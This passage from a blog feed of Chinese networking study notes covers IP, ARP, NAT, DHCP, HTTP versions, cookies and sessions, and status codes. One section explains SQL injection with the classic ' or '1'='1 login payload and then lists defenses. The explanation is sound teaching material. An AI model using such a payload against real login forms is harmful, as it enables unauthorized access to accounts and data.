<p><a href="https://xiaolincoding.com/interview/network.html#%E4%BB%80%E4%B9%88%E6%98%AFddos%E6%94%BB%E5%87%BB-%E6%80%8E%E4%B9%88%E9%98%B2%E8%8C%83">计算机网络面试题 | 小林coding (xiaolincoding.com)</a></p>
<h2 id="4-2-SQL注入">4.2 SQL注入</h2>
<h2 id="4-3-DNS劫持">4.3 DNS劫持</h2>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络：应用层</title>
    <url>/2024/05/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C(4)%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
    <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405201718354.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2"><strong>IP（Internet Protocol，网际协议）</strong>：TCP/IP 协议中最重要的协议之一，属于网络层的协议，主要作用是定义数据包的格式、对数据包进行路由和寻址，以便它们可以跨网络传播并到达正确的目的地。目前 IP 协议主要分为两种，一种是过去的 IPv4，另一种是较新的 IPv6，目前这两种协议都在使用，但后者已经被提议来取代前者。</li>
<li class="lvl-2"><strong>ARP（Address Resolution Protocol，地址解析协议）</strong>：ARP 协议解决的是网络层地址和链路层地址之间的转换问题。因为一个 IP 数据报在物理上传输的过程中，总是需要知道下一跳（物理上的下一个目的地）该去往何处，但 IP 地址属于逻辑地址，而 MAC 地址才是物理地址，ARP 协议解决了 IP 地址转 MAC 地址的一些问题。</li>
<li class="lvl-2"><strong>ICMP（Internet Control Message Protocol，互联网控制报文协议）</strong>：一种用于传输网络状态和错误消息的协议，常用于网络诊断和故障排除。例如，Ping 工具就使用了 ICMP 协议来测试网络连通性。</li>
<li class="lvl-2"><strong>NAT（Network Address Translation，网络地址转换协议）</strong>：NAT 协议的应用场景如同它的名称——网络地址转换，应用于内部网到外部网的地址转换过程中。具体地说，在一个小的子网（局域网，LAN）内，各主机使用的是同一个 LAN 下的 IP 地址，但在该 LAN 以外，在广域网（WAN）中，需要一个统一的 IP 地址来标识该 LAN 在整个 Internet 上的位置。</li>
</ul>
<h1>1 IP</h1>
<p><strong>IP（Internet Protocol，网际协议）</strong> 是 TCP/IP 协议中最重要的协议之一，属于网络层的协议，主要作用是定义数据包的格式、对数据包进行路由和寻址，以便它们可以跨网络传播并到达正确的目的地。</p>
<blockquote>
<p>MTU(最大传输单元，1500)</p>
</blockquote>
<h2 id="1-1-IPv4：20字节（无选项）">1.1 IPv4：20字节（无选项）</h2>
<blockquote>
<p>定义数据包的格式，对数据包进行路由和寻址</p>
</blockquote>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/20210721162737.png" alt="image-20210721162731377" style="zoom:50%;" />
<p>标识号确定数据报的顺序，标志比特为0表示接收到数据报的最后一片，</p>
<p>数据报通过链路层会分片，偏移量确定应放在数据报的什么位置，</p>
<p>一个链路层帧能承载的最大数据量叫做最大传送单元（Maximum Transmission Unit, MTU）</p>
<h2 id="1-2-因特网编址-计组内存寻址：直接映射、全相联映射、组相联映射">1.2 因特网编址-(计组内存寻址：直接映射、全相联映射、组相联映射)</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>分类编址：具有8、16、24比特子网地址的子网分别被称为A、B、C类网络。</p>
</li>
<li class="lvl-2">
<p>无类别域间路由选择（Classless Interdomain Routing, CIDR)</p>
</li>
</ul>
<h2 id="1-3-动态主机配置协议（Dynamic-Host-Configuration-DHCP）">1.3 动态主机配置协议（Dynamic Host Configuration, DHCP）</h2>
<blockquote>
<p>获取主机地址</p>
</blockquote>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/20210721171550.png" alt="image-20210721171550242" style="zoom:33%;" />
<h1>2 网络地址转换（Network Address Translation, NAT）</h1>
<p><strong>NAT（Network Address Translation，网络地址转换）</strong> 主要用于在不同网络之间转换 IP 地址。它允许将私有 IP 地址（如在局域网中使用的 IP 地址）映射为公有 IP 地址（在互联网中使用的 IP 地址）或者反向映射，从而实现局域网内的多个设备通过单一公有 IP 地址访问互联网。</p>
<h1>3 ARP协议（地址解析协议）</h1>
<blockquote>
<p><strong>地址解析协议（Address Resolution Protocol）</strong>，它解决的是网络层地址和链路层地址之间的转换问题。因为一个 IP 数据报在物理上传输的过程中，总是需要知道下一跳（物理上的下一个目的地）该去往何处，但 IP 地址属于逻辑地址，而 MAC 地址才是物理地址，ARP 协议解决了 IP 地址转 MAC 地址的一些问题。</p>
</blockquote>
<p>MAC 地址的全称是 <strong>媒体访问控制地址（Media Access Control Address）</strong>。如果说，互联网中每一个资源都由 IP 地址唯一标识（IP 协议内容），那么一切网络设备都由 MAC 地址唯一标识。MAC 地址也有一些别称，如 LAN 地址、物理地址、以太网地址等。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络：应用层</title>
    <url>/2023/02/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C(2)%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82/</url>
    <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405201718666.png" alt="image.png"></p>
<blockquote>
<p>HTTP、HTTPS、CDN、DNS、FTP 都是应用层协议</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">协议</th>
<th style="text-align:center">网络应用</th>
<th style="text-align:center">应用层协议</th>
<th style="text-align:center">支撑的运输协议</th>
<th style="text-align:center">描述</th>
<th style="text-align:center">应用程序体系结构</th>
<th style="text-align:left">端口号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">HTTP</td>
<td style="text-align:center">Web</td>
<td style="text-align:center">超文本传输协议(HyperText Transfer Protocol, HTTP)</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">无状态协议<br />Web文档的请求与响应</td>
<td style="text-align:center">客户-服务器</td>
<td style="text-align:left">Web服务器：80</td>
</tr>
<tr>
<td style="text-align:center">SMTP</td>
<td style="text-align:center">电子邮件</td>
<td style="text-align:center">简单邮件传输协议(Simple Mail Transfer Protocol, SMTP)<br />邮件访问协议：POP3</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center">电子邮件报文的传输</td>
<td style="text-align:center">SMTP：客户-服务器</td>
<td style="text-align:left">SMTP：25<br/>POP：110</td>
</tr>
<tr>
<td style="text-align:center">DNS</td>
<td style="text-align:center">因特网的目录服务</td>
<td style="text-align:center">域名系统(Domain Name System，DNS)</td>
<td style="text-align:center">UDP</td>
<td style="text-align:center">域名空间、域名服务器、域名解析过程<br/>主机名到IP地址转换的目录服务</td>
<td style="text-align:center">客户-服务器模型</td>
<td style="text-align:left">53</td>
</tr>
<tr>
<td style="text-align:center">FTP</td>
<td style="text-align:center">文件传输</td>
<td style="text-align:center">文件传输协议(FTP)</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center"></td>
<td style="text-align:center">客户-服务器模型</td>
<td style="text-align:left">控制连接：21<br />数据连接：20</td>
</tr>
<tr>
<td style="text-align:center">Telnet</td>
<td style="text-align:center">远程登陆协议</td>
<td style="text-align:center">Telnet</td>
<td style="text-align:center">TCP</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:center">SSH</td>
<td style="text-align:center">安全的网路传输协议</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:left">22</td>
</tr>
</tbody>
</table>
<h1>1 HTTP协议</h1>
<blockquote>
<p>HTTP 是一种不保存状态，即<strong>无状态（stateless）协议</strong>。也就是说 HTTP 协议自身不对请求和响应之间的通信状态进行保存。服务器不维护任何有关客户端过去所发请求的消息。<br>
HTTP 使用客户端-服务器模型，客户端向服务器发送 HTTP Request（请求），服务器响应请求并返回 HTTP Response（响应）</p>
</blockquote>
<h2 id="1-1-常用字段">1.1 常用字段</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>Host字段：有了 <code>Host</code> 字段，就可以将请求发往「同一台」服务器上的不同网站。</p>
</li>
<li class="lvl-2">
<p><mark>Content-Length</mark>字段：请求正文的字节数</p>
</li>
<li class="lvl-2">
<p>Connection：<code>Keep-Alive</code>（使用同一个 TCP 连接来发送和接收多个 HTTP 请求/应答，避免了连接建立和释放的开销，这个方法称为 <mark>HTTP 长连接</mark>。）</p>
</li>
</ul>
<h2 id="1-2-HTTP层请求类型">1.2 HTTP层请求类型</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>GET：用于请求获取指定资源，通常用于获取数据。</p>
</li>
<li class="lvl-2">
<p>POST：用于向服务器提交数据，通常用于提交表单数据或进行资源的创建。</p>
</li>
<li class="lvl-2">
<p>PUT：用于向服务器<mark>更新</mark>指定资源，通常用于更新已存在的资源。</p>
</li>
<li class="lvl-2">
<p>DELETE：用于请求服务器删除指定资源。</p>
</li>
<li class="lvl-2">
<p>HEAD：类似于GET请求，但只返回资源的头部信息，用于获取资源的元数据而不获取实际内容。</p>
</li>
</ul>
<h2 id="1-3-HTTP缓存技术">1.3 HTTP缓存技术</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>强制缓存</p>
</li>
<li class="lvl-2">
<p>协商缓存<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202409081559068.png" alt="image.png"></p>
</li>
</ul>
<h2 id="1-4-HTTP-1-1、HTTP-2、HTTP-3">1.4 HTTP/1.1、HTTP/2、HTTP/3</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404262014331.png" alt="image.png"></p>
<h3 id="1-4-1-HTTP-1-1">1.4.1 HTTP/1.1</h3>
<p>HTTP/1.1 是请求响应模型，如果第一个发送的请求，未收到对应的响应，那么后续的请求就不会发送（PS：HTTP/1.1 管道模式是默认不使用的，所以讨论 HTTP/1.1 的队头阻塞问题，是不考虑管道模式的）</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>HTTP/1.1 中的管道（ pipeline）虽然解决了请求的队头阻塞，但是<strong>没有解决响应的队头阻塞</strong>，因为服务端需要按顺序响应收到的请求，如果服务端处理某个请求消耗的时间比较长，那么只能等响应完这个请求后， 才能处理下一个请求，这属于 HTTP 层队头阻塞。</p>
</li>
<li class="lvl-2">
<p>HTTP/2 虽然通过多个请求复用一个 TCP 连接解决了 HTTP 的队头阻塞 ，但是<strong>一旦发生丢包，就会阻塞住所有的 HTTP 请求</strong>，这属于 TCP 层队头阻塞。</p>
</li>
</ul>
<h2 id="1-5-HTTP-1-0-和-HTTP-1-1-有什么区别？">1.5 HTTP/1.0 和 HTTP/1.1 有什么区别？</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>连接方式</strong> : HTTP/1.0 为<mark>短连接，HTTP/1.1 支持长连接</mark>。HTTP 协议的长连接和短连接，实质上是 TCP 协议的长连接和短连接。</p>
</li>
<li class="lvl-2">
<p><strong>状态响应码</strong> : HTTP/1.1 中新加入了大量的状态码，光是错误响应状态码就新增了 24 种。比如说，<code>100 (Continue)</code>——在请求大资源前的预热请求，<code>206 (Partial Content)</code>——范围请求的标识码，<code>409 (Conflict)</code>——请求与当前资源的规定冲突，<code>410 (Gone)</code>——资源已被永久转移，而且没有任何已知的转发地址。</p>
</li>
<li class="lvl-2">
<p><strong>缓存机制</strong> : 在 HTTP/1.0 中主要使用 Header 里的 If-Modified-Since,Expires 来做为缓存判断的标准，HTTP/1.1 则引入了更多的缓存控制策略例如 <mark>Entity tag</mark>，If-Unmodified-Since, If-Match, If-None-Match 等更多可供选择的缓存头来控制缓存策略。</p>
</li>
<li class="lvl-2">
<p><strong>带宽</strong>：<mark>范围请求</mark>，HTTP/1.0 中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP/1.1 则在请求头引入了<mark>range 头域</mark>，它允许只请求资源的某个部分，即返回码是 206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</p>
</li>
<li class="lvl-2">
<p><strong>Host 头（Host Header）处理</strong> :HTTP/1.1 引入了 Host 头字段，允许在同一 IP 地址上托管多个域名，从而支持<mark>虚拟主机</mark>的功能。而 HTTP/1.0 没有 Host 头字段，无法实现虚拟主机。</p>
</li>
<li class="lvl-2">
<p><mark>管道网路传输</mark>：HTTP/1.0串行请求，HTTP/1.1在同一个 TCP 连接里面，客户端可以发起多个请求，只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以<strong>减少整体的响应时间。</strong></p>
</li>
</ul>
<blockquote>
<p>[!note]<br>
<strong>服务器必须按照接收请求的顺序发送对这些管道化请求的响应</strong>，如果服务端在处理 A 请求时耗时比较长，那么后续的请求的处理都会被阻塞住，这称为==「队头堵塞」==。所以，<strong>HTTP/1.1 管道解决了请求的队头阻塞，但是没有解决响应的队头阻塞</strong>。</p>
</blockquote>
<blockquote>
<p>[!note] Host头处理</p>
</blockquote>
<p>域名系统（DNS）允许多个主机名绑定到同一个 IP 地址上，但是 HTTP/1.0 并没有考虑这个问题，假设我们有一个资源 URL 是<code>http://example1.org/home.html</code>，HTTP/1.0的请求报文中，将会请求的是<code>GET /home.html HTTP/1.0</code>.也就是不会加入主机名。这样的报文送到服务器端，服务器是理解不了客户端想请求的真正网址。</p>
<p>因此，HTTP/1.1 在请求头中加入了<code>Host</code>字段。加入<code>Host</code>字段的报文头部将会是:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example1.org</span><br></pre></td></tr></table></figure>
<p>这样，服务器端就可以确定客户端想要请求的真正的网址了。</p>
<h2 id="1-6-HTTP-1-1-和-HTTP-2-0-有什么区别？">1.6 HTTP/1.1 和 HTTP/2.0 有什么区别？</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>多路复用（Multiplexing）</strong>：HTTP/2.0 在同一连接上可以同时传输多个请求和响应（可以看作是 HTTP/1.1 中长链接的升级版本），互不干扰。HTTP/1.1 则使用串行方式，每个请求和响应都需要独立的连接，而浏览器为了控制资源会有 6-8 个 TCP 连接都限制。这使得 HTTP/2.0 在处理多个请求时更加高效，减少了网络延迟和提高了性能。<mark>HTTP/2.0 的多路复用使得不同的请求可以共用一个 TCP 连接</mark>，避免建立多个连接带来不必要的额外开销，而 HTTP/1.1 中的每个请求都会建立一个单独的连接</p>
</li>
<li class="lvl-2">
<p><strong>二进制帧（Binary Frames）</strong>：HTTP/2.0 使用二进制帧进行数据传输，而 HTTP/1.1 则使用文本格式的报文。二进制帧更加紧凑和高效，减少了传输的数据量和带宽消耗。</p>
</li>
<li class="lvl-2">
<p><strong>头部压缩（Header Compression）</strong>：HTTP/1.1 支持<code>Body</code>压缩，<code>Header</code>不支持压缩。HTTP/2.0 支持对<code>Header</code>压缩，使用了专门为<code>Header</code>压缩而设计的 HPACK 算法，减少了网络开销。</p>
</li>
<li class="lvl-2">
<p><strong>服务器推送（Server Push）</strong>：HTTP/2.0 支持服务器推送，可以在客户端请求一个资源时，将其他相关资源一并推送给客户端，从而减少了客户端的请求次数和延迟。而 HTTP/1.1 需要客户端自己发送请求来获取相关资源。</p>
</li>
</ul>
<h2 id="1-7-HTTP-2-0-和-HTTP-3-0-有什么区别？">1.7 HTTP/2.0 和 HTTP/3.0 有什么区别？</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>传输协议</strong>：HTTP/2.0 是基于 TCP 协议实现的，HTTP/3.0 新增了<code> QUIC（Quick UDP Internet Connections）</code> 协议来实现可靠的传输，提供与 TLS/SSL 相当的安全性，具有较低的连接和传输延迟。你可以将 QUIC 看作是 UDP 的升级版本，在其基础上新增了很多功能比如加密、重传等等。HTTP/3.0 之前名为 HTTP-over-QUIC，从这个名字中我们也可以发现，HTTP/3 最大的改造就是使用了 QUIC。</p>
</li>
<li class="lvl-2">
<p><strong>连接建立</strong>：HTTP/2.0 需要经过经典的 TCP 三次握手过程（由于安全的 HTTPS 连接建立还需要 TLS 握手，共需要大约 3 个 RTT）。由于 QUIC 协议的特性（TLS 1.3，TLS 1.3 除了支持 1 个 RTT 的握手，还支持 0 个 RTT 的握手）连接建立仅需 0-RTT 或者 1-RTT。这意味着 QUIC 在最佳情况下不需要任何的额外往返时间就可以建立新连接。</p>
</li>
<li class="lvl-2">
<p><strong>队头阻塞</strong>：HTTP/2.0 多请求复用一个 TCP 连接，一旦发生<mark>丢包</mark>，就会阻塞住所有的 HTTP 请求。由于 QUIC 协议的特性，HTTP/3.0 在一定程度上解决了==队头阻塞（Head-of-Line blocking, 简写：HOL blocking）==问题，一个连接建立多个不同的数据流，这些数据流之间独立互不影响，某个数据流发生丢包了，其数据流不受影响（本质上是多路复用+轮询）。</p>
</li>
<li class="lvl-2">
<p><strong>错误恢复</strong>：HTTP/3.0 具有更好的错误恢复机制，当出现丢包、延迟等网络问题时，可以更快地进行恢复和重传。而 HTTP/2.0 则需要依赖于 TCP 的错误恢复机制。</p>
</li>
<li class="lvl-2">
<p><strong>安全性</strong>：HTTP/2.0 和 HTTP/3.0 在安全性上都有较高的要求，支持加密通信，但在实现上有所不同。HTTP/2.0 使用 TLS 协议进行加密，而 HTTP/3.0 基于 QUIC 协议，包含了内置的加密和身份验证机制，可以提供更强的安全性。</p>
</li>
</ul>
<blockquote>
<p>[! Note] 队头阻塞</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>HTTP/1.1 中的管道（ pipeline）虽然解决了<mark>请求的队头阻塞</mark>，但是没有解决<mark>响应的队头阻塞</mark>，因为服务端需要按顺序响应收到的请求，如果服务端处理某个请求消耗的时间比较长，那么只能等响应完这个请求后， 才能处理下一个请求，这属于 HTTP 层队头阻塞。</p>
</li>
<li class="lvl-2">
<p>HTTP/2 虽然通过多个请求复用一个 TCP 连接解决了 HTTP 的队头阻塞 ，但是一旦发生<mark>丢包</mark>，就会阻塞住所有的 HTTP 请求，这属于 <mark>TCP 层队头阻塞</mark>。</p>
</li>
<li class="lvl-2">
<p>HTTP/2 队头阻塞的问题是因为 TCP，所以 <strong>HTTP/3 把 HTTP 下层的 TCP 协议改成了 UDP！</strong></p>
</li>
</ul>
<h2 id="1-8-队头阻塞">1.8 队头阻塞</h2>
<p>队头阻塞是指在 HTTP/2.0 中，多个 HTTP 请求和响应共享一个 TCP 连接，如果其中一个请求或响应因为网络拥塞或丢包而被阻塞，那么后续的请求或响应也无法发送，导致整个连接的效率降低。<code>这是由于 HTTP/2.0 在单个 TCP 连接上使用了多路复用，受到 TCP 拥塞控制的影响，少量的丢包就可能导致整个 TCP 连接上的所有流被阻塞。</code>HTTP/3.0 在一定程度上解决了队头阻塞问题，一个连接建立多个不同的数据流，这些数据流之间独立互不影响，某个数据流发生丢包了，其数据流不受影响（本质上是多路复用+轮询）。</p>
<p>当顺序发送的请求序列中的一个请求因为某种原因被阻塞时，在后面排队的所有请求也一同被阻塞了,会招致客户端一直请求不到数据，这也就是「<strong>队头阻塞</strong>」</p>
<h2 id="1-9-Cookie和Session">1.9 Cookie和Session</h2>
<p>HTTP协议是无状态的，而登录、购物车等需要知道用户状态。</p>
<p><strong>cookie</strong>： cookie是服务器传给客户端并保存在客户端的一段信息。cookie保存在了客户端，当我们去请求一个URL时，浏览器会根据这个URL路径将符合条件的Cookie放在请求头中传给服务器。</p>
<p><strong>session</strong>：<strong>Session是基于Cookie来工作</strong>，同一个客户端每次访问服务器时，只要当浏览器在第一次访问服务器时，服务器设置一个id并保存一些信息(例如登陆就保存用户信息，视具体情况)，并把这个id通过Cookie存到客户端，客户端每次和服务器交互时只传这个id，就可以实现维持浏览器和服务器的状态，而这个ID通常是NAME为sessionID的一个Cookie。</p>
<p>Session 的主要作用就是通过服务端记录用户的状态。典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了（一般情况下，服务器会在一定时间内保存这个 Session，过了时间限制，就会销毁这个 Session）。</p>
<p><code>Cookie</code> 数据保存在客户端(浏览器端)，<code>Session</code> 数据保存在服务器端。相对来说 <code>Session</code> 安全性更高。如果使用 <code>Cookie</code> 的一些敏感信息不要写入 <code>Cookie</code> 中，最好能将 <code>Cookie</code> 信息加密然后使用到的时候再去服务器端解密。</p>
<p>在服务端保存 Session 的方法很多，最常用的就是内存和数据库(比如是使用内存数据库 redis 保存)。既然 Session 存放在服务器端，那么我们如何实现 Session 跟踪呢？大部分情况下，我们都是通过在 Cookie 中附加一个 Session ID 来方式来跟踪。</p>
<blockquote>
<p>[!note] Cookie用途</p>
<ul class="lvl-1">
<li class="lvl-2">会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
<li class="lvl-2">个性化设置（如用户自定义设置、主题等）</li>
<li class="lvl-2">浏览器行为跟踪（如跟踪分析用户行为等）</li>
</ul>
</blockquote>
<blockquote>
<p>[!question] 主要区别</p>
</blockquote>
<ol>
<li class="lvl-3">
<p><strong>存储位置</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>Cookie的数据存储在客户端的浏览器中</p>
</li>
<li class="lvl-2">
<p>Session的数据则存放在服务器上</p>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p><strong>存储容量与类型</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>Cookie的存储容量相对较小，通常限制在4KB以内，并且只能存储字符串类型的数据。</p>
</li>
<li class="lvl-2">
<p>Session的存储容量没有明确的限制（但考虑到服务器性能，通常不建议存放过多数据），并且它可以存储任意类型的数据。</p>
</li>
</ul>
<ol start="3">
<li class="lvl-3">
<p><strong>有效期与生命周期</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>Cookie的有效期可以在设置时指定，只要不超过设置的过期时间，它可以长期保存在客户端。</p>
</li>
<li class="lvl-2">
<p>Session的生命周期则通常较短，它会在一定的操作时间（如30分钟）后失效，并且在用户关闭浏览器或会话结束时，Session数据会被清除。</p>
</li>
</ul>
<ol start="4">
<li class="lvl-3">
<p><strong>安全性</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>由于Cookie存储在客户端，存在被第三方截获或篡改的风险，因此安全性相对较低。攻击者可以通过分析或伪造Cookie来欺骗系统。</p>
</li>
<li class="lvl-2">
<p>Session数据存储在服务器上，相对更加安全，不容易被攻击者直接获取或修改。</p>
</li>
</ul>
<ol start="5">
<li class="lvl-3">
<p><strong>跨域支持</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>Cookie支持跨域名访问，即可以在不同的域名之间共享。</p>
</li>
<li class="lvl-2">
<p>Session则通常与特定的客户端和服务器端关联，不支持跨域访问。</p>
</li>
</ul>
<ol start="6">
<li class="lvl-3">
<p><strong>对服务器压力</strong>：</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>Cookie不占用服务器资源，因为数据存储在客户端。</p>
</li>
<li class="lvl-2">
<p>Session则需要在服务器上存储数据，因此对服务器的资源占用和性能有一定影响。</p>
</li>
</ul>
<p><a href="https://zhuanlan.zhihu.com/p/90750522">一文彻底搞懂cookie和session - 知乎 (zhihu.com)</a><br>
<a href="https://zhuanlan.zhihu.com/p/631349844"> 一文彻底搞清session、cookie、token的区别</a></p>
<h3 id="1-9-1-session共享">1.9.1 session共享</h3>
<ol>
<li class="lvl-3">
<p><strong>数据库存储</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">将session数据存储在数据库中，而不是仅仅存储在内存中。这样，无论请求发送到哪个服务器，都可以通过查询数据库来获取session数据。</li>
<li class="lvl-6">这种方法需要设计好数据库表结构，并编写相应的存储和检索逻辑。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>缓存系统</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">使用像Redis或Memcached这样的缓存系统来存储session数据。每个服务器都可以访问这个共享的缓存系统来获取和更新session数据。</li>
<li class="lvl-6">这种方法通常比数据库访问更快，并且能更好地处理大量并发请求。</li>
</ul>
</li>
</ol>
<h2 id="1-10-SQL注入攻击">1.10 SQL注入攻击</h2>
<p>攻击者在HTTP请求中注入恶意的SQL代码，服务器使用参数构建数据库SQL命令时，恶意SQL被一起构造，并在数据库中执行。 用户登录，输入用户名 lianggzone，密码 ‘ or ‘1’=’1 ，如果此时使用参数构造的方式，就会出现 select * from user where name = ‘lianggzone’ and password = ‘’ or ‘1’=‘1’ 不管用户名和密码是什么内容，使查询出来的用户列表不为空。</p>
<p>如何防范SQL注入攻击使用预编译的PrepareStatement是必须的，但是一般我们会从两个方面同时入手。<br>
Web端 1）有效性检验。 2）限制字符串输入的长度。服务端 1）不用拼接SQL字符串。 2）使用预编译的PrepareStatement。 3）有效性检验。(为什么服务端还要做有效性检验？第一准则，外部都是不可信的，防止攻击者绕过Web端请求) 4）过滤SQL需要的参数中的特殊字符。比如单引号、双引号。</p>
<h2 id="1-11-get和post">1.11 get和post</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>语义（主要区别）：GET 通常用于获取或查询资源，而 POST 通常用于创建或修改资源。</p>
</li>
<li class="lvl-2">
<p><mark>幂等</mark>：GET 请求是幂等的，即多次重复执行不会改变资源的状态，而 POST 请求是不幂等的，即每次执行可能会产生不同的结果或影响资源的状态。（<strong>可以对 GET 请求的数据做缓存，这个缓存可以做到浏览器本身上（彻底避免浏览器发请求）</strong>，<strong>也可以做到代理上（如nginx），而且在浏览器中 GET 请求可以保存为书签</strong>。）</p>
</li>
<li class="lvl-2">
<p>格式：GET 请求的参数通常放在 URL 中，形成查询字符串（querystring），而 POST 请求的参数通常放在请求体（body）中，可以有多种编码格式，如 application/x-www-form-urlencoded、multipart/form-data、application/json 等。GET 请求的 URL 长度受到浏览器和服务器的限制，而 POST 请求的 body 大小则没有明确的限制。不过，实际上 GET 请求也可以用 body 传输数据，只是并不推荐这样做，因为这样可能会导致一些兼容性或者语义上的问题。</p>
</li>
<li class="lvl-2">
<p>缓存：由于 GET 请求是幂等的，它可以被浏览器或其他中间节点（如代理、网关）缓存起来，以提高性能和效率。而 POST 请求则不适合被缓存，因为它可能有副作用，每次执行可能需要实时的响应。</p>
</li>
<li class="lvl-2">
<p>安全性：GET 请求和 POST 请求如果使用 HTTP 协议的话，那都不安全，因为 HTTP 协议本身是<mark>明文</mark>传输的，必须使用 HTTPS 协议来加密传输数据。另外，GET 请求相比 POST 请求更容易泄露敏感数据，因为 GET 请求的参数通常放在 URL 中。post更安全（不会作为url的一部分，不会被缓存、保存在服务器日志、以及浏览器浏览记录中）</p>
</li>
</ul>
<p><a href="https://www.runoob.com/http/http-tutorial.html">HTTP协议（HyperText Transfer Protocol，超文本传输协议）</a></p>
<p><a href="https://www.runoob.com/html/html-url.html">url(统一资源定位器 Uniform Resource Locators)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/128000072">万字长文，一文搞懂TCP、IP和HTTP、HTTPS</a></p>
<h2 id="1-12-响应报文状态码">1.12 响应报文状态码</h2>
  <img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/20210717222801.PNG" alt="IMG_2748(20210717-195049)"  />
200：请求成功； 301：永久重定向；302：临时重定向； 404：无法找到此页面；405：请求的方法类型不支持； 500：服务器内部出错。
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404261056667.png" alt="image.png"></p>
<p><code>1xx</code> 类状态码属于<strong>提示信息</strong>，是协议处理中的一种中间状态，实际用到的比较少。</p>
<p><code>2xx</code> 类状态码表示服务器<strong>成功</strong>处理了客户端的请求，也是我们最愿意看到的状态。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>「<strong>200 OK</strong>」是最常见的成功状态码，表示一切正常。如果是非 <code>HEAD</code> 请求，服务器返回的响应头都会有 body 数据。</p>
</li>
<li class="lvl-2">
<p>「<strong>204 No Content</strong>」也是常见的成功状态码，与 200 OK 基本相同，但响应头没有 body 数据。</p>
</li>
<li class="lvl-2">
<p>「<mark>206 Partial Content</mark>」是应用于 HTTP 分块下载或断点续传，表示响应返回的 body 数据并不是资源的全部，而是其中的一部分，也是服务器处理成功的状态。部分内容返回成功，这是范围请求的状态码，表示服务器返回了所请求的部分内容。</p>
</li>
</ul>
<p><code>3xx</code> 类状态码表示客户端请求的资源发生了变动，需要客户端用新的 URL 重新发送请求获取资源，也就是<strong>重定向</strong>。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>「<strong>301 Moved Permanently</strong>」表示永久重定向，说明请求的资源已经不存在了，需改用新的 URL 再次访问。</p>
</li>
<li class="lvl-2">
<p>「<strong>302 Found</strong>」表示临时重定向，说明请求的资源还在，但暂时需要用另一个 URL 来访问。</p>
</li>
</ul>
<p>301 和 302 都会在响应头里使用字段 <code>Location</code>，指明后续要跳转的 URL，浏览器会自动重定向新的 URL。</p>
<ul class="lvl-0">
<li class="lvl-2">
